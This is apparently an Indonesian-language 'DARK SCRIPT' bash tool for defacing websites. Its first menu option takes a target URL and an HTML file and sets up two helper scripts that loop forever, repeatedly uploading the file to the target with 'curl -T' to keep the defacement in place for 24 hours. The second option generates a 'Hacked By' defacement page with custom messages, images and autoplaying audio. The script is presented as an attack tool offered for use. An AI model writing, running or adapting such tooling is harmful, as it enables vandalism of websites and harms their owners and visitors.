#!/bin/bash
clear

echo -e '''
\e[0;35m██████╗  █████╗ ██████╗ ██╗  ██╗    ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗
\e[1;36m██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝
\e[0;35m██║  ██║███████║██████╔╝█████╔╝     ███████╗██║     ██████╔╝██║██████╔╝   ██║   
\e[1;36m██║  ██║██╔══██║██╔══██╗██╔═██╗     ╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   
\e[0;35m██████╔╝██║  ██║██║  ██║██║  ██╗    ███████║╚██████╗██║  ██║██║██║        ██║   
\e[1;36m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   
'''

echo ''
echo -e '\e[0;32m[\e[0;31m#\e[0;32m]\e[1;37m===============================\e[0;32m[\e[0;31m!\e[0;32m]'
echo -e '\e[1;33m[\e[1;32m*\e[1;33m][\e[0;31m1\e[1;33m] \e[0;36mDEFACE 24 JAM               \e[1;33m[\e[1;32m*\e[1;33m]'
echo -e '\e[1;33m[\e[1;32m*\e[1;33m][\e[0;31m2\e[1;33m] \e[0;36mBUAT SCRIPT HTML            \e[1;33m[\e[1;32m*\e[1;33m]'
echo -e '\e[1;33m[\e[1;32m*\e[1;33m][\e[0;31mx\e[1;33m] \e[0;36mKELUAR                      \e[1;33m[\e[1;32m*\e[1;33m]'
echo -e '\e[0;32m[\e[0;31m#\e[0;32m]\e[1;37m===============================\e[0;32m[\e[0;31m!\e[0;32m]'
echo ''

read -p 'root@DARK_SEC ~# ' jj

if [ "$jj" = "1" ]; then
    read -p $'\e[32mWebsite yang mau di-deface ~> \e[0m' target
    echo -e '\e[1;31mNOTE:\e[0m Jika file HTML berada di folder lain, gunakan path lengkap: /home/kamu/folder/nama_file.html'
    read -p $'\e[32mScript HTML ~> \e[0m' file

    # Buat ulang file login.sh
    rm -f login.sh
    cat <<EOF > login.sh
curl -T "$file" "$target"
sh conf.sh
EOF

    # Buat ulang file conf.sh
    rm -f conf.sh
    cat <<EOF > conf.sh
bash login.sh
EOF

    echo -e '\n24 JAM TEBAS DIMULAI!'
    echo 'Situs Anda tidak akan dideface orang lain!'
    echo 'Silakan tidur dengan tenang :)'
    echo 'JANGAN tutup script ini kalau tidak mau diambil alih orang lain!'
    
    bash login.sh

elif [ "$jj" = "2" ]; then
    read -p $'\e[32mNama Anda: \e[0m' user3
    read -p $'\e[32mPesan pertama: \e[0m' pesanf
    read -p $'\e[32mPesan kedua: \e[0m' pesang
    read -p $'\e[32mPesan ketiga: \e[0m' pesanh
    read -p $'\e[32mPesan keempat: \e[0m' pesanj

    rm -f index.html
    cat <<EOF > index.html
<html>
<head>
<title>Hacked By $user3</title>
<style>
body {
    background: url(https://vignette.wikia.nocookie.net/steven-universe/images/a/a6/Space_like.gif/revision/latest?cb=20170413133510) no-repeat center center fixed;
    background-size: cover;
}
h1 {
    color: #00e2bd;
    text-align: center;
    font-size: 46px;
    font-family: fantasy;
    text-shadow: 0px 0px 60px #d10000;
}
</style>
</head>
<body>
<h1>Hacked by $user3</h1>
<hr size="10px" width="98%" color="#0090bc">
<center>
<img src="http://3.bp.blogspot.com/-dCijSi1fl4s/Vc6jF5hFEOI/AAAAAAAABGE/4Q4tDf4ZgUE/s1600/Garuda%2BPancasila.png" height="300" width="270" />
</center>
<br>
<div style="text-align: center;">
<script>
var text = "( pesan untuk anda )<br>$pesanf<br>$pesang<br>$pesanh<br>$pesanj<br>SCRIPT BY MR_DARK :)";
var delay = 90;
var currentChar = 0;
var destination = "textDestination";
function type() {
    var dest = document.getElementById(destination);
    if (dest) {
        dest.innerHTML = text.substr(0, currentChar) + "<blink>_</blink>";
        currentChar++;
        if (currentChar > text.length) {
            currentChar = 1;
            setTimeout(type, 5000);
        } else {
            setTimeout(type, delay);
        }
    }
}
function startTyping(t, d, dest) {
    text = t;
    delay = d;
    currentChar = 0;
    destination = dest;
    type();
}
startTyping(text, delay, destination);
</script>
<b><font face="courier new">
<div id="textDestination" style="color:#00e2bd; font: 50px arial;"></div>
</font></b>
<hr size="10px" width="100%" color="#0090bc" style="position: fixed; bottom: 0;">
<audio src="https://i.top4top.io/m_16036g6f61.mp3" autoplay loop></audio>
<center>
<audio autoplay controls src="https://i.top4top.io/m_16036g6f61.mp3" type="audio/mpeg"></audio>
</center>
</body>
</html>
EOF

    read -p 'Sekalian deface sekarang? (y/t): ' y
    if [[ "$y" == "y" || "$y" == "Y" ]]; then
        bash dark_script.sh
    else
        echo 'Bye!'
        exit
    fi

elif [[ "$jj" == "x" || "$jj" == "X" ]]; then
    echo 'Bye!'
    exit
else
    echo "Opsi tidak dikenali."
fi
